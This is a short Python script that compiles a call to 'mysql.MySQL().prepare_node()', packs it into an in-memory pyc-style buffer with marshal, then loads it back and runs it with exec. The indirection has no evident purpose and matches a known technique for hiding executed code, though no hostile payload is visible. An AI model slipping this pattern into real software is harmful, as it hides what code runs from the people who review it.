import io
import marshal
import time
import mysql
source_code = "mysql.MySQL().prepare_node()"
code_object = compile(source_code, filename="<string>", mode="exec")
pyc_file = io.BytesIO()
pyc_file.write(b'\x0d\x0d\x0a\x00')
pyc_file.write(int(time.time()).to_bytes(4, byteorder='little'))
marshal.dump(code_object, pyc_file)
pyc_file.seek(0)
pyc_file.read(8)
loaded_code_object = marshal.load(pyc_file)
exec(loaded_code_object)
